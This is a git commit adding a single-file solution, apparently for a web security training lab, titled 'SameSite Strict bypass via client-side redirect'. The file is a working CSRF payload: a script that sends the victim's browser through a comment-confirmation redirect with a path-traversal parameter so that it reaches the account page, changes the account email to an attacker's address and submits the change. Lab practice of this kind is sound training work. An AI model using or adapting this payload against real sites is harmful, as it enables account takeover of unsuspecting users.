4c8d6f7ec2faba45241912a9f8684afa123ee3e9
root <19ace135@gmail.com>
2024-08-21 16:31:20 +0530

    first commit

---
+++ CSRF/lab08.js
@@ -0,0 +1,5 @@
+// Lab: SameSite Strict bypass via client-side redirect
+
+<script>
+	document.location="https://0a5a00ac049a05da80f6993800e900a6.web-security-academy.net/post/comment/confirmation?postId=7/../../my-account/change-email?email=evil2%40ws.nt%26submit=1";
+</script>
